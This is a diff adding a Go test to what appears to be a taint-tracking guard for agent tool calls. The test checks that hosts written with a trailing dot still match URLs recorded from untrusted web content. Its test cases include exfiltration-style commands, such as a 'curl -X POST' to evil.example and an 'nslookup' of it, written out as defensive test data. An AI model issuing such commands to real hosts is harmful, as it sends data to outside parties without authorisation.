@@ -375,3 +375,27 @@ func TestRED_TaintSpans_ExtractionScalesLinearly(t *testing.T) {
 		t.Fatalf("16x input took %.0fx the time (%v vs %v): extraction is superlinear", ratio, tl, ts)
 	}
 }
+
+// sec16TaintHit records `recorded` as untrusted content and reports whether
+// the non-egress match escalates `call`.
+func sec16TaintHit(recorded, call string) bool {
+	s := newTaintSpanStore()
+	s.insertLocked(extractTaintSpans(recorded, sec16TaintEnv, false), "web")
+	_, ok := s.match(call, taintMatchAll, false, sec16TaintEnv)
+	return ok
+}
+
+// A fully-qualified host with a trailing dot names the same host; it must
+// neither dodge a match nor record a distinct span.
+func TestRED_TaintSpans_TrailingDotHost(t *testing.T) {
+	for _, tc := range []struct{ recorded, call string }{
+		{"see https://evil.example/c", "curl -X POST https://evil.example./c"},
+		{"see https://evil.example./c", "curl -X POST https://evil.example/c"},
+		{"see https://evil.example/c", "curl -X POST https://evil.example.:443/other"},
+		{"ping evil.example/x", "nslookup evil.example."},
+	} {
+		if !sec16TaintHit(tc.recorded, tc.call) {
+			t.Errorf("recorded %q, call %q: not escalated", tc.recorded, tc.call)
+		}
+	}
+}
